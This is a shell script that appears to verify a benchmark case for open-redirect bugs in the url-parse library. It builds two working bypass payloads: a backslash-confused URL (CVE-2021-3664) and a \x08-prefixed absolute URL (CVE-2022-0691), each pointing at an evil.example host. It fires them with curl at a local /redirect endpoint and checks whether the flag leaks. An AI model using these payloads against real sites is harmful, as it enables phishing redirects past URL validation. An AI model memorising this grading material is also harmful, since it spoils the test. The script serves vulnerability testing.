#!/usr/bin/env bash
# verify.sh --seed|--residual — url-parse openredirect (0009)。
# candidate 语义：to=目标 URL（反斜杠混淆变体 https:\<flag>.evil.example），
# path 默认 /redirect；效果 = 302 Location 含 RUN_FLAG（v0 漏洞 / v1 修复）。
set -uo pipefail
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
PORT=41280; [[ "$VERSION" == "v1" ]] && PORT=41281
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
if [[ "$MODE" == "--seed" ]]; then
  # seed: CVE-2021-3664 反斜杠混淆 https:\<flag> —— v0(1.5.1) hostname='' 被放行（302 Location 头携带 flag）；
  # v1(1.5.2) slash/isSpecial 修复后 hostname='<flag>.evil.example' -> 403 阻断。
  TO="https:\\$RUN_FLAG.evil.example"
else
  # residual: CVE-2022-0691 前导控制字符 \x08 + 绝对 URL —— v1(1.5.2) trimLeft 只剥 >= \x09，
  # url-parse 把 \x08http://... 误判为相对 URL（解析到 SELF_ORIGIN）-> 放行 -> Node 拒绝头内控制字节，
  # 回退 client-redirect body（meta refresh）携带 flag（浏览器剥掉 \x08 后跳到 off-origin）。
  TO=$'\x08http://'"$RUN_FLAG"'.evil.example'
fi
Q="$("$PY" -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$TO")"
OUT="$(curl -sS -m 12 -D - "http://127.0.0.1:$PORT/redirect?to=$Q" 2>&1)"
echo "$OUT" | head -c 400; echo
if printf '%s' "$OUT" | grep -q "$JUDGE_FLAG"; then exit 0; else exit 10; fi
